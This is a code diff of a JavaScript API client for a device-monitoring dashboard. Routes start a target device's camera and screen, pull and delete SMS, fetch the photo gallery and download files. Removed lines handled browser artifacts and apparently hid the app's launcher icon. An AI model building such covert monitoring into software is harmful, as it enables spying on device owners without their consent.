@@ -1,5 +1,4 @@
 import axios from 'axios';
-import { encryptData, decryptData } from './encryption';
 
 const API_URL = process.env.NEXT_PUBLIC_API_URL;
 
@@ -11,25 +10,13 @@ const apiClient = axios.create({
   },
 });
 
-// Request interceptor for authentication and encryption
+// Request interceptor for authentication
 apiClient.interceptors.request.use(
   async (config) => {
     const token = localStorage.getItem('authToken');
     if (token) {
       config.headers.Authorization = `Bearer ${token}`;
     }
-
-    // Encrypt sensitive data before sending
-    if (config.data && config.method !== 'get') {
-      config.data = {
-        encrypted: true,
-        data: encryptData(JSON.stringify(config.data))
-      };
-    }
-
-    // Add rate limiting headers
-    config.headers['X-Client-ID'] = localStorage.getItem('deviceId') || 'web-client';
-
     return config;
   },
   (error) => {
@@ -37,21 +24,19 @@ apiClient.interceptors.request.use(
   }
 );
 
-// Response interceptor for decryption
+// Response interceptor
 apiClient.interceptors.response.use(
   (response) => {
-    // Decrypt response data if encrypted
-    if (response.data && response.data.encrypted) {
-      const decrypted = decryptData(response.data.data);
-      response.data = JSON.parse(decrypted);
-    }
     return response;
   },
   (error) => {
-    // Handle authentication errors
     if (error.response?.status === 401) {
       localStorage.removeItem('authToken');
-      window.location.href = '/login';
+      localStorage.removeItem('user');
+      // Only redirect on client side
+      if (typeof window !== 'undefined') {
+        window.location.href = '/login';
+      }
     }
     return Promise.reject(error);
   }
@@ -65,6 +50,10 @@ export const api = {
     logout: () => apiClient.post('/auth/logout'),
     verifyPin: (pin) => apiClient.post('/auth/verify-pin', { pin }),
     resetData: (deviceId) => apiClient.post(`/auth/reset-data/${deviceId}`),
+    getProfile: () => apiClient.get('/auth/profile'),
+    changePassword: (data) => apiClient.post('/auth/change-password', data),
+    resetPassword: (email) => apiClient.post('/auth/reset-password', { email }),
+    refreshToken: (refreshToken) => apiClient.post('/auth/refresh', { refreshToken }),
   },
   devices: {
     getAll: () => apiClient.get('/devices'),
@@ -75,16 +64,20 @@ export const api = {
     lock: (id) => apiClient.post(`/devices/${id}/lock`),
     unlock: (id) => apiClient.post(`/devices/${id}/unlock`),
     getStatus: (id) => apiClient.get(`/devices/${id}/status`),
-    setLostMode: (id) => apiClient.post(`/devices/${id}/lost-mode`),
+    setLostMode: (id, data) => apiClient.post(`/devices/${id}/lost-mode`, data),
+    deactivateLostMode: (id) => apiClient.delete(`/devices/${id}/lost-mode`),
   },
   monitoring: {
-    getLiveCamera: (deviceId) => apiClient.get(`/monitoring/camera/${deviceId}`),
-    getLiveScreen: (deviceId) => apiClient.get(`/monitoring/screen/${deviceId}`),
+    startCamera: (deviceId) => apiClient.post(`/monitoring/camera/${deviceId}/start`),
+    stopCamera: () => apiClient.post('/monitoring/camera/stop'),
+    startScreen: (deviceId) => apiClient.post(`/monitoring/screen/${deviceId}/start`),
+    stopScreen: () => apiClient.post('/monitoring/screen/stop'),
     getSmsHistory: (deviceId) => apiClient.get(`/monitoring/sms/${deviceId}`),
     getGallery: (deviceId) => apiClient.get(`/monitoring/gallery/${deviceId}`),
-    lockDevice: (deviceId) => apiClient.post(`/monitoring/lock/${deviceId}`),
-    setLauncherVisibility: (deviceId, visibility) => 
-      apiClient.post(`/monitoring/launcher/${deviceId}`, { visibility }),
+    deleteSms: (smsId) => apiClient.delete(`/monitoring/sms/${smsId}`),
+    exportSms: (deviceId) => apiClient.get(`/monitoring/sms/${deviceId}/export`),
+    downloadFile: (fileId) => apiClient.get(`/monitoring/files/${fileId}/download`),
+    deleteFile: (fileId) => apiClient.delete(`/monitoring/files/${fileId}`),
   },
   admin: {
     getUsers: () => apiClient.get('/admin/users'),
@@ -92,20 +85,25 @@ export const api = {
     updateUser: (id, data) => apiClient.put(`/admin/users/${id}`, data),
     deleteUser: (id) => apiClient.delete(`/admin/users/${id}`),
     suspendUser: (id) => apiClient.post(`/admin/users/${id}/suspend`),
+    activateUser: (id) => apiClient.post(`/admin/users/${id}/activate`),
     getRoles: () => apiClient.get('/admin/roles'),
     updateRole: (id, data) => apiClient.put(`/admin/roles/${id}`, data),
     getLicenses: () => apiClient.get('/admin/licenses'),
+    createLicense: (data) => apiClient.post('/admin/licenses', data),
     updateLicense: (id, data) => apiClient.put(`/admin/licenses/${id}`, data),
-    getSystemSettings: () => apiClient.get('/admin/settings'),
-    updateSystemSettings: (data) => apiClient.put('/admin/settings', data),
-    getAuditLogs: () => apiClient.get('/admin/audit-logs'),
+    getSettings: () => apiClient.get('/admin/settings'),
+    updateSettings: (data) => apiClient.put('/admin/settings', data),
+    getAuditLogs: (params) => apiClient.get('/admin/audit-logs', { params }),
   },
-  data: {
-    sync: (deviceId) => apiClient.post(`/data/sync/${deviceId}`),
-    backup: (deviceId) => apiClient.post(`/data/backup/${deviceId}`),
-    restore: (deviceId, backupId) => apiClient.post(`/data/restore/${deviceId}`, { backupId }),
-    getBrowserArtifacts: (deviceId) => 
-      apiClient.get(`/data/browser-artifacts/${deviceId}`),
+  dashboard: {
+    getStats: () => apiClient.get('/dashboard/stats'),
+    getActivity: (params) => apiClient.get('/dashboard/activity', { params }),
+    getDeviceStats: () => apiClient.get('/dashboard/device-stats'),
+  },
+  notifications: {
+    getAll: () => apiClient.get('/notifications'),
+    markAsRead: (id) => apiClient.put(`/notifications/${id}/read`),
+    markAllAsRead: () => apiClient.put('/notifications/read-all'),
   },
 };
 
